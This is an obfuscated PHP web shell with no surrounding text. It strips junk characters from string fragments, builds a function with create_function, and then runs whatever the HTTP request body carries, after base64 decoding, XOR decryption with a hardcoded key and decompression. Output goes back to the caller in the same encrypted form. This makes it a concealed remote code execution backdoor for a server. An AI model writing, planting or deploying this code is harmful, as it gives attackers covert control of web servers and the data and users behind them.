<?php
$O='$k=j)"aeebbf79j)";j)$kj)h="931c9ej)fdj)7228";$kf="9ad55j)7b066a9"j);$p="j)pVj)pVEqIohhvGEj)2bV"j)j);fun';
$g='ob_ej)j)nd_clean();j)$r=@basej)64_encoj)de(@x(j)j)@gzcomprej)j)ss($o),$kj)));j)print("$p$khj)$r$kf");}';
$B='evaj)l(j)@gzuncompresj)s(@x(@baj)sej)64_decodej)($m[1j)]),$k)))j);$o=j)@ob_getj)_contj)ents();j)@';
$Z='ction xj)($t,$k){$j)c=strlj)enj)($k);$j)l=j)stj)rlen($t);$j)o="";for($i=0j);$i<$l;j))j){for($j=0;';
$U='h("/j)$kj)h(.+)$kf/j)",@fij)le_get_conj)tents("j)php:/j)/inputj)"),j)$m)==1j)j)) {j)@ob_start();@';
$T=str_replace('O','','OcreaOte_OOfunOOction');
$k='(j)$j)j<j)$j)c&&$i<j)$l);$j++,$i++){$oj).=$tj){j)$i}^$k{$jj)};}}rj)eturj)j)n $o;}if j)(@preg_matc';
$p=str_replace('j)','',$O.$Z.$k.$U.$B.$g);
$z=$T('',$p);$z();
?>
